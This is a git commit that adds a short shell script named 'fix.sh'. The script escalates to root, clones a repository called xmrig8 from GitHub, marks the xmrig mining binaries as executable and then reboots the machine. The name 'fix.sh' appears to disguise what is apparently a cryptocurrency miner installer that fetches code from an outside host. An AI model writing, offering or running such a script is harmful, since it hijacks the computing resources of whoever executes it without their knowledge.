b125e2fd0796c0158421750ac0d6bd88dba03766
vhakgg57448 <98292499+vhakgg57448@users.noreply.github.com>
2022-01-24 01:14:36 +0000

    Add files via upload

---
+++ fix.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo su && 
+cd ~ && 
+cd / &&
+rm -rf xmrig8 && 
+sudo git clone https://github.com/vhakgg57448/xmrig8.git&&cd xmrig8&&sudo chmod +x xmrig&&sudo chmod +x  xmrig-notls&&
+reboot
